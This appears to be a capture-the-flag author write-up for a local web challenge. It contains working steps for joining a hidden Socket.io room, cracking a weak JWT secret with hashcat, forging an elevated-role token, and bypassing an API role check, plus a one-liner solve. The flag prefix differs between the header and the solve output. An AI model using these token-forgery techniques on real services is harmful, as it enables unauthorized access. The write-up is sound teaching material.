# ShadowDesk — Author Writeup
**Category:** Web / Crypto  
**Difficulty:** Medium  
**Flag:** `Cybersphere{sh4d0w_s0ck3t_jwt_4nd_1nt3l_4p1_pwn3d}`

---

## Overview

Three chained vulnerabilities:

1. **Socket.io room enumeration** — hidden room name exposed via `Object.freeze` in the minified JS bundle
2. **JWT weak secret cracking** — operative token signed with a dictionary word; forgeable with hashcat + rockyou
3. **Hidden API authorization bypass** — `/api/intel` enforces role check, bypassed with the forged handler token

---

## Stage 1 — Room Enumeration

### What the player sees

A dark ops dashboard. Nothing obviously exploitable in the UI. The public feed shows a few generic dispatch messages.

### The exploit

1. Open **DevTools → Sources** (or Network tab, find `bundle.js`).
2. Search for `Object.freeze` in the minified bundle. They'll find:

   ```js
   Object.freeze({public:"public_feed",internal:"shadow_ops"})
   ```

3. The string `"shadow_ops"` is the hidden Socket.io room. Join it from the console:

   ```js
   // open DevTools console on the page
   const s = io();          // re-use or grab the existing socket
   s.emit('join', 'shadow_ops');
   s.on('message', console.log);
   ```

4. Two messages arrive from `SYS_INTERNAL`:

   ```
   [WARN] Operative provisioning endpoint still exposed: GET /api/token/operative — rotate credentials immediately
   [INFO] Classified intel archive mounted at /api/intel — handler-clearance bearer token required for access
   ```

**Leaks obtained:**
- Token endpoint: `GET /api/token/operative`
- Protected endpoint: `GET /api/intel`

---

## Stage 2 — JWT Weak Secret Cracking

### Fetch the operative token

```bash
curl http://localhost:3000/api/token/operative
```

Response:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJvcC03NzM0IiwiaGFuZGxlIjoiU1BFQ1RSRSIsInJvbGUiOiJvcGVyYXRpdmUiLCJjbGVhcmFuY2UiOjEsImlhdCI6MTcxMDAwMDAwMCwiZXhwIjoxNzEwMDA3MjAwfQ.<sig>",
  "issued_at": "...",
  "note": "Operative-level access only. Escalation requires handler clearance."
}
```

### Decode the payload

```bash
echo "<base64_payload_part>" | base64 -d | python3 -m json.tool
# → {"uid":"op-7734","handle":"SPECTRE","role":"operative","clearance":1, ...}
```

**Target:** change `role` from `"operative"` to `"handler"`.

### Crack the secret with hashcat

```bash
hashcat -a 0 -m 16500 <full_jwt_token> /usr/share/wordlists/rockyou.txt
```

Cracks immediately. Secret: **`shadow`**

> `shadow` appears early in rockyou.txt — expect crack time < 5 seconds on any GPU, < 30 s on CPU-only.

### Forge a handler token (Python)

```python
import jwt

SECRET  = "shadow"
payload = {
    "uid":       "op-7734",
    "handle":    "SPECTRE",
    "role":      "handler",      # escalated from "operative"
    "clearance": 5,
}

token = jwt.encode(payload, SECRET, algorithm="HS256")
print(token)
```

Install dependency if needed: `pip install pyjwt`

---

## Stage 3 — Hidden API Authorization Bypass

### Attempt with operative token (expect 403)

```bash
curl -H "Authorization: Bearer <operative_token>" http://localhost:3000/api/intel
# → {"error":"Clearance denied","required_role":"handler","your_role":"operative"}
```

### Use the forged handler token

```bash
curl -H "Authorization: Bearer <forged_handler_token>" http://localhost:3000/api/intel
```

Response:

```json
{
  "classification": "TOP SECRET // NOFORN",
  "archive": "SHADOW DESK INTEL — HANDLER EYES ONLY",
  "reports": [
    {
      "ref": "SD-001",
      "title": "OPERATION NIGHTFALL — Status",
      "body": "Asset CARDINAL successfully exfiltrated. Berlin safe house confirmed. Cover intact."
    },
    {
      "ref": "SD-002",
      "title": "Network Penetration — Eastern Sector",
      "body": "Twelve endpoints compromised via supply-chain vector. ..."
    },
    {
      "ref": "SD-003",
      "title": "DIRECTOR'S EYES ONLY — Final Extraction Code",
      "body": "Securinets{sh4d0w_s0ck3t_jwt_4nd_1nt3l_4p1_pwn3d}"
    }
  ]
}
```

**Flag:** `Securinets{sh4d0w_s0ck3t_jwt_4nd_1nt3l_4p1_pwn3d}`

---

## Full One-Liner Solve (after cracking)

```bash
# 1. Get token
TOKEN=$(curl -s http://localhost:3000/api/token/operative | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. Forge handler token (requires pyjwt)
FORGED=$(python3 -c "
import jwt
print(jwt.encode({'uid':'op-7734','role':'handler','clearance':5},'shadow',algorithm='HS256'))
")

# 3. Hit the intel endpoint
curl -s -H "Authorization: Bearer $FORGED" http://localhost:3000/api/intel | python3 -m json.tool
```

---

## Intended Learning Outcomes

| Stage | Skill |
|-------|-------|
| 1 | Source code analysis of minified JS; Socket.io room manipulation |
| 2 | JWT structure and weak HMAC secret attacks (hashcat HS256 mode 16500) |
| 3 | REST API authorization bypass via token forgery |

---

## Running the challenge

```bash
docker-compose up --build
# → http://localhost:3000
```

No external services required. Everything runs in a single container.
